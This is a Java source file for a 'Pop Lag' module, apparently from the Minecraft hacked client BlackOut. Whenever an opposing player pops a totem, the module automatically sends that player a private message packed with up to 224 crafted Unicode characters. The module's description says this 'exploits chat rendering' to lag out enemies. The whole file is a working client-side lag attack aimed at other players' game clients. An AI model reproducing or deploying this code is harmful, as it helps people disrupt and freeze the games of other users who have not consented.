package bodevelopment.client.blackout.module.modules.combat.misc;

import bodevelopment.client.blackout.BlackOut;
import bodevelopment.client.blackout.event.Event;
import bodevelopment.client.blackout.event.events.PopEvent;
import bodevelopment.client.blackout.manager.Managers;
import bodevelopment.client.blackout.module.Module;
import bodevelopment.client.blackout.module.SubCategory;
import bodevelopment.client.blackout.module.modules.combat.offensive.AutoCrystal;
import bodevelopment.client.blackout.module.setting.Setting;
import bodevelopment.client.blackout.module.setting.SettingGroup;
import bodevelopment.client.blackout.randomstuff.timers.TimerList;

import java.util.UUID;

public class PopLag extends Module {
    private final SettingGroup sgGeneral = this.addGroup("General");

    private final Setting<Boolean> target = this.sgGeneral.booleanSetting("Target Only", true,
            "Only attempts to lag the player currently targeted by AutoCrystal.");
    private final Setting<String> command = this.sgGeneral.stringSetting("Command", "msg",
            "The command used to deliver the lag string (e.g., 'msg', 'w', 'tell').");
    private final Setting<Integer> length = this.sgGeneral.intSetting("Message Length", 200, 0, 224, 1,
            "The amount of characters to send. Higher values cause more lag but may be blocked by some servers.");
    private final Setting<Double> cooldown = this.sgGeneral.doubleSetting("Cooldown (Minutes)", 2.0, 0.0, 10.0, 0.1,
            "Prevents spamming the lag command to the same player too frequently.");

    private final TimerList<UUID> sent = new TimerList<>(true);

    public PopLag() {
        super("Pop Lag", "Exploits chat rendering to lag out enemies when they pop a totem.", SubCategory.MISC_COMBAT, true);
    }

    @Event
    public void onPop(PopEvent event) {
        if (event.player != BlackOut.mc.player && !Managers.FRIENDS.isFriend(event.player)) {
            UUID uuid = event.player.getUuid();
            if (!this.sent.contains(uuid)) {
                if (this.target.get() && AutoCrystal.getInstance().targetedPlayer != event.player) {
                    return;
                }

                BlackOut.mc.getNetworkHandler().sendChatCommand(this.command.get() + " " + event.player.getName().getString() + " " + this.buildString());
                this.sent.add(uuid, this.cooldown.get() * 60.0);
            }
        }
    }

    private String buildString() {
        StringBuilder builder = new StringBuilder();
        int offset = 0;

        for (int left = this.length.get(); left > 0; offset++) {
            for (int i = 0; i < Math.min(left, 222); i++) {
                builder.append((char) ((i + 2) * 256 + offset));
                left--;
            }
        }

        return builder.toString();
    }
}
